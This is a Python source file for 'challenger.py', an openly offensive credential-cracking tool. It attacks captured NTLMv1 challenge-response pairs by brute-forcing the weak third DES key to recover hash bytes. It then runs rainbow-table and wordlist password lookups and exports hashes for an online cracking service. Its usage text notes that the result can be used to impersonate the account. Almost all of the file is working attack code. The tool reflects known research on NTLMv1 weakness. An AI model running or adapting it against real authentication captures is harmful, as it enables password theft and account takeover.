#!/usr/bin/python
'''challenger.py - Enables attacks on NETLMv1 challenge-response pairs for hash or password recovery'''

import sys, struct, binascii, os, base64
from Crypto.Cipher import DES
from Crypto.Hash import MD4

__author__ = "Tim Ehrhart"
__email__ = "tehrhart@gmail.com"
__license__ = "GPLv3"
__version__ = "0.93"
__status__ = "Development"
__date__ = "20130804"

def testKey(key, challenge):
    des = DES.new(key, DES.MODE_ECB)
    return des.encrypt(challenge)

def ntlmChallengeResponse(word, challenge):
    '''ntlmChallengeResponse(word, challenge) -> NETNTv1 hash'''
    uword = word.strip().decode('latin-1').encode('utf-16-le')
    ntlmHash = md4hash(uword)
    response = []
    response.append(testKey(key56_to_key64(ntlmHash[0:14]), challenge))
    response.append(testKey(key56_to_key64(ntlmHash[14:28]), challenge))
    response.append(testKey(key56_to_key64(ntlmHash[28:] + '0000000000'), challenge))
    return binascii.hexlify(response[0]) + \
           binascii.hexlify(response[1]) + \
           binascii.hexlify(response[2])

def md4hash(word):
    h = MD4.new()
    h.update(b'' + word)
    return h.hexdigest()

def parityOf(int_type):
    #Calcs parity of an integer: 0 for even # of bits, and -1 for odd 
    parity = 0
    while (int_type):
        parity = ~parity
        int_type = int_type & (int_type - 1)
    return(parity)

def oddParityValues():
    results = []
    for x in range(256):
        if parityOf(x) < 0: 
            results.append(struct.pack('<B', x))
    return results

def set_key_odd_parity(key):
    ""
    for i in range(len(key)):
        for k in range(7):
            bit = 0
            t = key[i] >> k
            bit = (t ^ bit) & 0x1
        key[i] = (key[i] & 0xFE) | bit

    return key


def key56_to_key64(key_raw):
    ""
    key_raw = binascii.unhexlify(key_raw)
    key_56 = []
    for i in key_raw:
        key_56.append(ord(i))

    key = []
    for i in range(8): key.append(0)

    key[0] = key_56[0];
    key[1] = ((key_56[0] << 7) & 0xFF) | (key_56[1] >> 1);
    key[2] = ((key_56[1] << 6) & 0xFF) | (key_56[2] >> 2);
    key[3] = ((key_56[2] << 5) & 0xFF) | (key_56[3] >> 3);
    key[4] = ((key_56[3] << 4) & 0xFF) | (key_56[4] >> 4);
    key[5] = ((key_56[4] << 3) & 0xFF) | (key_56[5] >> 5);
    key[6] = ((key_56[5] << 2) & 0xFF) | (key_56[6] >> 6);
    key[7] =  (key_56[6] << 1) & 0xFF;

    key = set_key_odd_parity(key)

    #Ints to char
    keyout = ''
    for k in key:
        keyout = keyout + chr(k)

    return keyout

def stripParityBits(number):
    #Strips the 8th (parity) bit from each byte, concatinating the bits together and returning the results
    results = ''
    for i in range(len(number)):
        # get first (up to) 7 bits of the byte
        bits = bin(ord(number[i]))[2:]
        bits = bits[:(len(bits)-1)]
        # left pad to 7 bits
        while (len(bits) < 7):
            bits = '0' + bits
        results = results + bits
    return results

def crackThirdKey(challenge,hashPart3):
    #Third set attack prep for instant crack
    suffix = '\x01\x01\x01\x01\x01' #Last 5 key bytes are constant (for 3rd set)
    thirdbyte = ['\x01', '\x40', '\x80', '\xc1'] #Four possible 3rd bytes
    firsttwo = oddParityValues() #Bytes must be odd parity, so only use those
    for b in thirdbyte:
        for a2 in firsttwo:
            for a1 in firsttwo:
                if (testKey((a1 + a2 + b + suffix), challenge) == hashPart3):
                    print "[*] Recovered key! DES key used for 3rd part of hash is %s" % (binascii.hexlify(a1 + a2 + b + suffix))
                    return (a1 + a2 + b + suffix)
                
    print "[!] ERROR: Key not found! Is the challenge/response data actually for NTLMv1?"
    exit()


def rainbowLookup(lastTwo, challenge, response):
    #TODO Make RT work for separate NTLM and LM tables
    filename = 'rainbowtable/'+lastTwo[0:2]+'/'+lastTwo[2:]
    directory = os.path.dirname(filename)

    try:
        f = open(filename, 'r')
        for line in f:
            if ntlmChallengeResponse(line.strip(), challenge) == binascii.hexlify(response):
                uword = line.strip().decode('latin-1').encode('utf-16-le')
                ntlmHash = md4hash(uword)
                print "[*] Key recovered from Rainbow Table!"
                print ""
                print "        Password:   %s" % line.strip()
                print "        NTLM Hash:  %s" % ntlmHash
                print ""
                quit() 
    except IOError:
        print "The Rainbow Table file does not exist. Please copy a wordlist to wordlist.txt and execute rtchallange.py"


def dictionaryLookup(challenge, response):
    #TODO Use recovered byte to speed this attack up
    # --Need to use last byte to skip 2/3 of DES rounds
    # --Write own NTLM hash implementation to do this

    filename = 'wordlist.txt'
    directory = os.path.dirname(filename)

    f = open(filename, 'r')
    for line in f:
        if ntlmChallengeResponse(line.strip(), challenge) == binascii.hexlify(response):
            uword = line.strip().decode('latin-1').encode('utf-16-le')
            ntlmHash = md4hash(uword)
            print "[*] Key recovered from wordlist!"
            print ""
            print "        Password:   %s" % line.strip()
            print "        NTLM Hash:  %s" % ntlmHash
            print ""
            quit()
 
def cloudcracker(lastTwo, challenge, response):
    ''' Export the hash data in a CloudCracker.com compatible format. '''
    C1C2 = response[:16]
    return "$99$" + base64.encodestring(challenge + C1C2 + binascii.unhexlify(lastTwo))

def processChapCrack(chapcrackHash):
    ''' Accept CloudCracker.com formatted hashes (e.g. $99$xxxxxxxxx) '''
    #Extract 
    rawHashData = base64.decodestring(chapcrackHash[4:])
    challenge = rawHashData[:8]
    hashPart1 = rawHashData[8:16]
    hashPart2 = rawHashData[16:24]
    #Recreate the 3rd hash
    hashPart3 = testKey(key56_to_key64(binascii.hexlify(rawHashData[24:]) + '0000000000'), challenge)

    fullhash = hashPart1 + hashPart2 + hashPart3 
    return [challenge, fullhash]

def main():

    if (len(sys.argv) == 1):
        print "Challenger NETLMv1 Attack Tool"
        print "   version %s (%s)" % (__version__,__date__)
        print "   by %s (%s)" % (__author__, __email__)
        print ""
        print "Attacks NETLMv1 challenge-response pairs with cryptographic attack"
        print "recovering the last 2-bytes of any NT/LM hash instantly. Further"
        print "recovery can be attempted via rainbow-table style lookups,"
        print "accelerated password guessing, and DES key exhaustion."
        print ""
        print "Usage:"
        print "   %s <challenge> <NT or LM response hash>" % sys.argv[0]
        print "   %s '<CloudCracker hash from chapcrack>'" % sys.argv[0]
        print "   %s [-t | --test]  (demo mode)" % sys.argv[0]
        print ""
        print "For rainbow table-like attacks, use rtchallenge.py to generate"
        print "the appropriate rainbow tables and store the rainbow directory"
        print "in the same directory as %s." % sys.argv[0]
        print ""
        #print "For accelerated password attacks (similar speed to normal LM or"
        #print "NTLM) place a file or symlink called 'wordlist.txt' in this"
        #print "directory."
        #print ""
        print "If all attacks fail, a version of the hash is output (which contains"
        print "the known last two-bytes) in a format suitable for use on"
        print "CloudCracker.com. The results from cloudcracker.com include the"
        print "'key', which in this case is the actual NTLM hash from the"
        print "authentication, which can be used to impersonate the account.\n"
        quit()

    if (len(sys.argv) > 2):
        challenge = sys.argv[1].decode("hex") 
        response  = sys.argv[2].decode("hex")

    elif (sys.argv[1][:4] == "$99$"):
        ccdata = processChapCrack(sys.argv[1])
        challenge = ccdata[0]
        response = ccdata[1]

    elif ((sys.argv[1] == "--test") or (sys.argv[1] == "-t")):
        #Challenge-Response Test Vectors (password of 'hashcat')
        challenge = '\x11\x22\x33\x44\x55\x66\x77\x88'
        response  = '\x51\xa5\x39\xe6\xee\x06\x1f\x64\x7c\xd5\xd4\x8c\xe6\xc6\x86\x65\x37\x37\xc5\xe1\xde\x26\xac\x4c' 
        print "[*] Demo mode. Using 'hashcat' as test password for demo."
        print "    NTLM (MD4) hash of 'hashcat' is 'b4b9b02e6f09a9bd760f388b67351e2b'"
        print "    Use '%s <challenge> <hash>' to attack another hash. " % (sys.argv[0])

    else:
        quit()

    #Split the response into three parts
    hashPart1 = response[0:8]
    hashPart2 = response[8:16]
    hashPart3 = response[16:]

    recoveredKey = ['','','']

    #Start output
    print "[*] Begining attack"
    print "      Challenge:   %s" % binascii.hexlify(challenge)
    print "      Response:    %s\n" % binascii.hexlify(response)

    #Start attack on part 3 - only 16 bits of entropy 
    print "[*] Attacking 3rd part of hash (%s)" % binascii.hexlify(hashPart3) 

    #Results of Third Key crack get parity bits stripped
    tempKey = stripParityBits(crackThirdKey(challenge,hashPart3))

    #Key is set after removing last 5 bytes of null padding
    recoveredKey[2] = binascii.hexlify(binascii.unhexlify('%x' % int('0b' + (tempKey[:16]), 2)))

    print '[*] Last 2 bytes of unencrypted hash are: %s' % recoveredKey[2]

    #Now, do a rainbow table-like lookup -or- brute force the DES keys -or- do accelerated password guessing
    print '[*] Doing Rainbow Table lookup'
    rainbowLookup(recoveredKey[2], challenge, response)
    print '    ...Not found :-('    

    '''    Disabled wordlist attack - kinda silly since it's faster to just calculate the rainbow table
    #Now attempt a wordlist attack
    print '[*] Doing dictionary attack'
    #TODO Separate dict attacks for NT and LM hash types
    dictionaryLookup(challenge, response)
    print '    ...Not found :-('  
    '''

    #Finally, bruteforce the DES keys
    #TODO Output format compatible with cloudcracker.com?
    cloudCrackerHash = cloudcracker(recoveredKey[2], challenge, response)
    print "[*] Hash for use at cloudcracker.com:"
    print "      %s" % cloudCrackerHash

if __name__ == "__main__":
    main()

